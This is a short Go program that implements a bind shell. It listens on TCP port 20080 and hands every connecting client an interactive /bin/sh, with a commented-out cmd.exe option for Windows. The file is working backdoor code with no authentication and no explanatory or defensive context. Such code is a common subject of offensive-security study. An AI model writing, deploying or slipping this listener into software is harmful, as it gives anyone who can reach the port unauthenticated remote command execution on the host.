package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func handle(conn net.Conn) {
	//cmd := exec.Command("cmd.exe")
	cmd := exec.Command("/bin/sh", "-i")

	//Create synched reader and writer
	rp, wp := io.Pipe()

	//set stdin to the connection
	cmd.Stdin = conn

	//Assign writer to stdout
	cmd.Stdout = wp

	//Link pipereader to conn
	//Any stdout will be piped to read then conn
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func main() {
	listener, err := net.Listen("tcp", ":20080")
	if err != nil {
		log.Fatalln(err)
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln(err)
		}
		go handle(conn)
	}
}
